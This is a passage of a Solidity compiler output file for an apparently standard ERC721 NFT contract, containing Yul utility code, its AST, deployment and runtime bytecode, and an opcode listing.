15","type":"","value":"0"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"3964:6:15"},"nodeType":"YulFunctionCall","src":"3964:12:15"},"nodeType":"YulExpressionStatement","src":"3964:12:15"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulFunctionDefinition","src":"3865:117:15"},{"body":{"nodeType":"YulBlock","src":"4036:54:15","statements":[{"nodeType":"YulAssignment","src":"4046:38:15","value":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"4064:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"4071:2:15","type":"","value":"31"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4060:3:15"},"nodeType":"YulFunctionCall","src":"4060:14:15"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"4080:2:15","type":"","value":"31"}],"functionName":{"name":"not","nodeType":"YulIdentifier","src":"4076:3:15"},"nodeType":"YulFunctionCall","src":"4076:7:15"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"4056:3:15"},"nodeType":"YulFunctionCall","src":"4056:28:15"},"variableNames":[{"name":"result","nodeType":"YulIdentifier","src":"4046:6:15"}]}]},"name":"round_up_to_mul_of_32","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"4019:5:15","type":""}],"returnVariables":[{"name":"result","nodeType":"YulTypedName","src":"4029:6:15","type":""}],"src":"3988:102:15"}]},"contents":"{\n\n    function abi_decode_available_length_t_string_memory_ptr_fromMemory(src, length, end) -> array {\n        array := allocate_memory(array_allocation_size_t_string_memory_ptr(length))\n        mstore(array, length)\n        let dst := add(array, 0x20)\n        if gt(add(src, length), end) { revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() }\n        copy_memory_to_memory(src, dst, length)\n    }\n\n    // string\n    function abi_decode_t_string_memory_ptr_fromMemory(offset, end) -> array {\n        if iszero(slt(add(offset, 0x1f), end)) { revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() }\n        let length := mload(offset)\n        array := abi_decode_available_length_t_string_memory_ptr_fromMemory(add(offset, 0x20), length, end)\n    }\n\n    function abi_decode_tuple_t_string_memory_ptrt_string_memory_ptr_fromMemory(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := mload(add(headStart, 0))\n            if gt(offset, 0xffffffffffffffff) { revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() }\n\n            value0 := abi_decode_t_string_memory_ptr_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := mload(add(headStart, 32))\n            if gt(offset, 0xffffffffffffffff) { revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() }\n\n            value1 := abi_decode_t_string_memory_ptr_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function allocate_memory(size) -> memPtr {\n        memPtr := allocate_unbounded()\n        finalize_allocation(memPtr, size)\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function array_allocation_size_t_string_memory_ptr(length) -> size {\n        // Make sure we can allocate memory without overflow\n        if gt(length, 0xffffffffffffffff) { panic_error_0x41() }\n\n        size := round_up_to_mul_of_32(length)\n\n        // add length slot\n        size := add(size, 0x20)\n\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function finalize_allocation(memPtr, size) {\n        let newFreePtr := add(memPtr, round_up_to_mul_of_32(size))\n        // protect against overflow\n        if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() }\n        mstore(64, newFreePtr)\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x41() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x41)\n        revert(0, 0x24)\n    }\n\n    function revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() {\n        revert(0, 0)\n    }\n\n    function revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function round_up_to_mul_of_32(value) -> result {\n        result := and(add(value, 31), not(31))\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"60806040523480156200001157600080fd5b50604051620026da380380620026da83398181016040528101906200003791906200019f565b81600090805190602001906200004f92919062000071565b5080600190805190602001906200006892919062000071565b505050620003a8565b8280546200007f90620002b9565b90600052602060002090601f016020900481019282620000a35760008555620000ef565b82601f10620000be57805160ff1916838001178555620000ef565b82800160010185558215620000ef579182015b82811115620000ee578251825591602001919060010190620000d1565b5b509050620000fe919062000102565b5090565b5b808211156200011d57600081600090555060010162000103565b5090565b60006200013862000132846200024d565b62000224565b90508281526020810184848401111562000157576200015662000388565b5b6200016484828562000283565b509392505050565b600082601f83011262000184576200018362000383565b5b81516200019684826020860162000121565b91505092915050565b60008060408385031215620001b957620001b862000392565b5b600083015167ffffffffffffffff811115620001da57620001d96200038d565b5b620001e8858286016200016c565b925050602083015167ffffffffffffffff8111156200020c576200020b6200038d565b5b6200021a858286016200016c565b9150509250929050565b60006200023062000243565b90506200023e8282620002ef565b919050565b6000604051905090565b600067ffffffffffffffff8211156200026b576200026a62000354565b5b620002768262000397565b9050602081019050919050565b60005b83811015620002a357808201518184015260208101905062000286565b83811115620002b3576000848401525b50505050565b60006002820490506001821680620002d257607f821691505b60208210811415620002e957620002e862000325565b5b50919050565b620002fa8262000397565b810181811067ffffffffffffffff821117156200031c576200031b62000354565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b61232280620003b86000396000f3fe608060405234801561001057600080fd5b50600436106100cf5760003560e01c80636352211e1161008c578063a22cb46511610066578063a22cb46514610224578063b88d4fde14610240578063c87b56dd1461025c578063e985e9c51461028c576100cf565b80636352211e146101a657806370a08231146101d657806395d89b4114610206576100cf565b806301ffc9a7146100d457806306fdde0314610104578063081812fc14610122578063095ea7b31461015257806323b872dd1461016e57806342842e0e1461018a575b600080fd5b6100ee60048036038101906100e99190611863565b6102bc565b6040516100fb9190611b80565b60405180910390f35b61010c61039e565b6040516101199190611b9b565b60405180910390f35b61013c600480360381019061013791906118bd565b610430565b6040516101499190611b19565b60405180910390f35b61016c60048036038101906101679190611823565b610476565b005b6101886004803603810190610183919061170d565b61058e565b005b6101a4600480360381019061019f919061170d565b6105ee565b005b6101c060048036038101906101bb91906118bd565b61060e565b6040516101cd9190611b19565b60405180910390f35b6101f060048036038101906101eb91906116a0565b610695565b6040516101fd9190611cdd565b60405180910390f35b61020e61074d565b60405161021b9190611b9b565b60405180910390f35b61023e600480360381019061023991906117e3565b6107df565b005b61025a60048036038101906102559190611760565b6107f5565b005b610276600480360381019061027191906118bd565b610857565b6040516102839190611b9b565b60405180910390f35b6102a660048036038101906102a191906116cd565b6108bf565b6040516102b39190611b80565b60405180910390f35b60007f80ac58cd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916148061038757507f5b5e139f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b80610397575061039682610953565b5b9050919050565b6060600080546103ad90611ed1565b80601f01602080910402602001604051908101604052809291908181526020018280546103d990611ed1565b80156104265780601f106103fb57610100808354040283529160200191610426565b820191906000526020600020905b81548152906001019060200180831161040957829003601f168201915b5050505050905090565b600061043b826109bd565b6004600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b60006104818261060e565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614156104f2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104e990611c9d565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16610511610a08565b73ffffffffffffffffffffffffffffffffffffffff161480610540575061053f8161053a610a08565b6108bf565b5b61057f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161057690611cbd565b60405180910390fd5b6105898383610a10565b505050565b61059f610599610a08565b82610ac9565b6105de576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105d590611bbd565b60405180910390fd5b6105e9838383610b5e565b505050565b610609838383604051806020016040528060008152506107f5565b505050565b60008061061a83610e58565b9050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141561068c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161068390611c7d565b60405180910390fd5b80915050919050565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610706576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106fd90611c5d565b60405180910390fd5b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60606001805461075c90611ed1565b80601f016020809104026020016040519081016040528092919081815260200182805461078890611ed1565b80156107d55780601f106107aa576101008083540402835291602001916107d5565b820191906000526020600020905b8154815290600101906020018083116107b857829003601f168201915b5050505050905090565b6107f16107ea610a08565b8383610e95565b5050565b610806610800610a08565b83610ac9565b610845576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161083c90611bbd565b60405180910390fd5b61085184848484611002565b50505050565b6060610862826109bd565b600061086c61105e565b9050600081511161088c57604051806020016040528060008152506108b7565b8061089684611075565b6040516020016108a7929190611af5565b6040516020818303038152906040525b915050919050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b60007f01ffc9a7000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916149050919050565b6109c68161114d565b610a05576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109fc90611c7d565b60405180910390fd5b50565b600033905090565b816004600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16610a838361060e565b73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92560405160405180910390a45050565b600080610ad58361060e565b90508073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480610b175750610b1681856108bf565b5b80610b5557508373ffffffffffffffffffffffffffffffffffffffff16610b3d84610430565b73ffffffffffffffffffffffffffffffffffffffff16145b91505092915050565b8273ffffffffffffffffffffffffffffffffffffffff16610b7e8261060e565b73ffffffffffffffffffffffffffffffffffffffff1614610bd4576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610bcb90611bfd565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610c44576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c3b90611c1d565b60405180910390fd5b610c51838383600161118e565b8273ffffffffffffffffffffffffffffffffffffffff16610c718261060e565b73ffffffffffffffffffffffffffffffffffffffff1614610cc7576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cbe90611bfd565b60405180910390fd5b6004600082815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690556001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055506001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a4610e5383838360016112b4565b505050565b60006002600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610f04576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610efb90611c3d565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c3183604051610ff59190611b80565b60405180910390a3505050565b61100d848484610b5e565b611019848484846112ba565b611058576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161104f90611bdd565b60405180910390fd5b50505050565b606060405180602001604052806000815250905090565b60606000600161108484611451565b01905060008167ffffffffffffffff8111156110a3576110a2611fc1565b5b6040519080825280601f01601f1916602001820160405280156110d55781602001600182028036833780820191505090505b509050600082602001820190505b600115611142578080600190039150507f3031323334353637383961626364656600000000000000000000000000000000600a86061a8153600a858161112c5761112b611f63565b5b049450600085141561113d57611142565b6110e3565b819350505050919050565b60008073ffffffffffffffffffffffffffffffffffffffff1661116f83610e58565b73ffffffffffffffffffffffffffffffffffffffff1614159050919050565b60018111156112ae57600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16146112225780600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461121a9190611de7565b925050819055505b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146112ad5780600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546112a59190611d91565b925050819055505b5b50505050565b50505050565b60006112db8473ffffffffffffffffffffffffffffffffffffffff166115a4565b15611444578373ffffffffffffffffffffffffffffffffffffffff1663150b7a02611304610a08565b8786866040518563ffffffff1660e01b81526004016113269493929190611b34565b602060405180830381600087803b15801561134057600080fd5b505af192505050801561137157506040513d601f19601f8201168201806040525081019061136e9190611890565b60015b6113f4573d80600081146113a1576040519150601f19603f3d011682016040523d82523d6000602084013e6113a6565b606091505b506000815114156113ec576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113e390611bdd565b60405180910390fd5b805181602001fd5b63150b7a0260e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614915050611449565b600190505b949350505050565b600080600090507a184f03e93ff9f4daa797ed6e38ed64bf6a1f01000000000000000083106114af577a184f03e93ff9f4daa797ed6e38ed64bf6a1f01000000000000000083816114a5576114a4611f63565b5b0492506040810190505b6d04ee2d6d415b85acef810000000083106114ec576d04ee2d6d415b85acef810000000083816114e2576114e1611f63565b5b0492506020810190505b662386f26fc10000831061151b57662386f26fc10000838161151157611510611f63565b5b0492506010810190505b6305f5e1008310611544576305f5e100838161153a57611539611f63565b5b0492506008810190505b612710831061156957612710838161155f5761155e611f63565b5b0492506004810190505b6064831061158c576064838161158257611581611f63565b5b0492506002810190505b600a831061159b576001810190505b80915050919050565b6000808273ffffffffffffffffffffffffffffffffffffffff163b119050919050565b60006115da6115d584611d1d565b611cf8565b9050828152602081018484840111156115f6576115f5611ff5565b5b611601848285611e8f565b509392505050565b60008135905061161881612290565b92915050565b60008135905061162d816122a7565b92915050565b600081359050611642816122be565b92915050565b600081519050611657816122be565b92915050565b600082601f83011261167257611671611ff0565b5b81356116828482602086016115c7565b91505092915050565b60008135905061169a816122d5565b92915050565b6000602082840312156116b6576116b5611fff565b5b60006116c484828501611609565b91505092915050565b600080604083850312156116e4576116e3611fff565b5b60006116f285828601611609565b925050602061170385828601611609565b9150509250929050565b60008060006060848603121561172657611725611fff565b5b600061173486828701611609565b935050602061174586828701611609565b92505060406117568682870161168b565b9150509250925092565b6000806000806080858703121561177a57611779611fff565b5b600061178887828801611609565b945050602061179987828801611609565b93505060406117aa8782880161168b565b925050606085013567ffffffffffffffff8111156117cb576117ca611ffa565b5b6117d78782880161165d565b91505092959194509250565b600080604083850312156117fa576117f9611fff565b5b600061180885828601611609565b92505060206118198582860161161e565b9150509250929050565b6000806040838503121561183a57611839611fff565b5b600061184885828601611609565b92505060206118598582860161168b565b9150509250929050565b60006020828403121561187957611878611fff565b5b600061188784828501611633565b91505092915050565b6000602082840312156118a6576118a5611fff565b5b60006118b484828501611648565b91505092915050565b6000602082840312156118d3576118d2611fff565b5b60006118e18482850161168b565b91505092915050565b6118f381611e1b565b82525050565b61190281611e2d565b82525050565b600061191382611d4e565b61191d8185611d64565b935061192d818560208601611e9e565b61193681612004565b840191505092915050565b600061194c82611d59565b6119568185611d75565b9350611966818560208601611e9e565b61196f81612004565b840191505092915050565b600061198582611d59565b61198f8185611d86565b935061199f818560208601611e9e565b80840191505092915050565b60006119b8602d83611d75565b91506119c382612015565b604082019050919050565b60006119db603283611d75565b91506119e682612064565b604082019050919050565b60006119fe602583611d75565b9150611a09826120b3565b604082019050919050565b6000611a21602483611d75565b9150611a2c82612102565b604082019050919050565b6000611a44601983611d75565b9150611a4f82612151565b602082019050919050565b6000611a67602983611d75565b9150611a728261217a565b604082019050919050565b6000611a8a601883611d75565b9150611a95826121c9565b602082019050919050565b6000611aad602183611d75565b9150611ab8826121f2565b604082019050919050565b6000611ad0603d83611d75565b9150611adb82612241565b604082019050919050565b611aef81611e85565b82525050565b6000611b01828561197a565b9150611b0d828461197a565b91508190509392505050565b6000602082019050611b2e60008301846118ea565b92915050565b6000608082019050611b4960008301876118ea565b611b5660208301866118ea565b611b636040830185611ae6565b8181036060830152611b758184611908565b905095945050505050565b6000602082019050611b9560008301846118f9565b92915050565b60006020820190508181036000830152611bb58184611941565b905092915050565b60006020820190508181036000830152611bd6816119ab565b9050919050565b60006020820190508181036000830152611bf6816119ce565b9050919050565b60006020820190508181036000830152611c16816119f1565b9050919050565b60006020820190508181036000830152611c3681611a14565b9050919050565b60006020820190508181036000830152611c5681611a37565b9050919050565b60006020820190508181036000830152611c7681611a5a565b9050919050565b60006020820190508181036000830152611c9681611a7d565b9050919050565b60006020820190508181036000830152611cb681611aa0565b9050919050565b60006020820190508181036000830152611cd681611ac3565b9050919050565b6000602082019050611cf26000830184611ae6565b92915050565b6000611d02611d13565b9050611d0e8282611f03565b919050565b6000604051905090565b600067ffffffffffffffff821115611d3857611d37611fc1565b5b611d4182612004565b9050602081019050919050565b600081519050919050565b600081519050919050565b600082825260208201905092915050565b600082825260208201905092915050565b600081905092915050565b6000611d9c82611e85565b9150611da783611e85565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115611ddc57611ddb611f34565b5b828201905092915050565b6000611df282611e85565b9150611dfd83611e85565b925082821015611e1057611e0f611f34565b5b828203905092915050565b6000611e2682611e65565b9050919050565b60008115159050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b82818337600083830152505050565b60005b83811015611ebc578082015181840152602081019050611ea1565b83811115611ecb576000848401525b50505050565b60006002820490506001821680611ee957607f821691505b60208210811415611efd57611efc611f92565b5b50919050565b611f0c82612004565b810181811067ffffffffffffffff82111715611f2b57611f2a611fc1565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4552433732313a2063616c6c6572206973206e6f7420746f6b656e206f776e6560008201527f72206f7220617070726f76656400000000000000000000000000000000000000602082015250565b7f4552433732313a207472616e7366657220746f206e6f6e20455243373231526560008201527f63656976657220696d706c656d656e7465720000000000000000000000000000602082015250565b7f4552433732313a207472616e736665722066726f6d20696e636f72726563742060008201527f6f776e6572000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a207472616e7366657220746f20746865207a65726f2061646460008201527f7265737300000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f766520746f2063616c6c657200000000000000600082015250565b7f4552433732313a2061646472657373207a65726f206973206e6f74206120766160008201527f6c6964206f776e65720000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20696e76616c696420746f6b656e2049440000000000000000600082015250565b7f4552433732313a20617070726f76616c20746f2063757272656e74206f776e6560008201527f7200000000000000000000000000000000000000000000000000000000000000602082015250565b7f4552433732313a20617070726f76652063616c6c6572206973206e6f7420746f60008201527f6b656e206f776e6572206f7220617070726f76656420666f7220616c6c000000602082015250565b61229981611e1b565b81146122a457600080fd5b50565b6122b081611e2d565b81146122bb57600080fd5b50565b6122c781611e39565b81146122d257600080fd5b50565b6122de81611e85565b81146122e957600080fd5b5056fea2646970667358221220d8ee7fada685f0b32f66df66d6451cea01150b5c19624f410f83018282edc5bb64736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x26DA CODESIZE SUB DUP1 PUSH3 0x26DA DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH3 0x37 SWAP2 SWAP1 PUSH3 0x19F JUMP JUMPDEST DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x4F SWAP3 SWAP2 SWAP1 PUSH3 0x71 JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x68 SWAP3 SWAP2 SWAP1 PUSH3 0x71 JUMP JUMPDEST POP POP POP PUSH3 0x3A8 JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH3 0x7F SWAP1 PUSH3 0x2B9 JUMP JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH3 0xA3 JUMPI PUSH1 0x0 DUP6 SSTORE PUSH3 0xEF JUMP JUMPDEST DUP3 PUSH1 0x1F LT PUSH3 0xBE JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0xEF JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0xEF JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0xEE JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0xD1 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0xFE SWAP2 SWAP1 PUSH3 0x102 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x11D JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x103 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x138 PUSH3 0x132 DUP5 PUSH3 0x24D JUMP JUMPDEST PUSH3 0x224 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH3 0x157 JUMPI PUSH3 0x156 PUSH3 0x388 JUMP JUMPDEST JUMPDEST PUSH3 0x164 DUP5 DUP3 DUP6 PUSH3 0x283 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH3 0x184 JUMPI PUSH3 0x183 PUSH3 0x383 JUMP JUMPDEST JUMPDEST DUP2 MLOAD PUSH3 0x196 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH3 0x121 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH3 0x1B9 JUMPI PUSH3 0x1B8 PUSH3 0x392 JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP4 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x1DA JUMPI PUSH3 0x1D9 PUSH3 0x38D JUMP JUMPDEST JUMPDEST PUSH3 0x1E8 DUP6 DUP3 DUP7 ADD PUSH3 0x16C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 DUP4 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x20C JUMPI PUSH3 0x20B PUSH3 0x38D JUMP JUMPDEST JUMPDEST PUSH3 0x21A DUP6 DUP3 DUP7 ADD PUSH3 0x16C JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x230 PUSH3 0x243 JUMP JUMPDEST SWAP1 POP PUSH3 0x23E DUP3 DUP3 PUSH3 0x2EF JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH3 0x26B JUMPI PUSH3 0x26A PUSH3 0x354 JUMP JUMPDEST JUMPDEST PUSH3 0x276 DUP3 PUSH3 0x397 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x2A3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x286 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH3 0x2B3 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH3 0x2D2 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 EQ ISZERO PUSH3 0x2E9 JUMPI PUSH3 0x2E8 PUSH3 0x325 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x2FA DUP3 PUSH3 0x397 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH3 0x31C JUMPI PUSH3 0x31B PUSH3 0x354 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 